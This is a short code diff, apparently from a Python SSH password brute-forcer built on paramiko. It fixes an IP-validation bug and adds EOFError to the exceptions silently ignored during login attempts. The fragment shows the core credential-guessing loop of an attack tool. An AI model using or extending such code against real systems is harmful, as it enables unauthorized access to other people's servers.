@@ -17,8 +17,7 @@ def check_ip(ip):
     if len(myip) != 4:
         return False
     for octet in myip:
-        if int(octet) > 255 and int(octet) < 0:
-            print('asd')
+        if int(octet) > 255 or int(octet) < 0:
             return False
     return True
 
@@ -40,7 +39,7 @@ def brute(start, end, step):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(IP, port=PORT, username=username, password=password, banner_timeout=200)
-            except (Exception,ConnectionAbortedError,paramiko.SSHException,paramiko.ssh_exception.SSHException):
+            except (Exception,ConnectionAbortedError,paramiko.SSHException,paramiko.ssh_exception.SSHException,EOFError):
                 pass
                 # print("%s:%s failed"%(username,password))
             else:
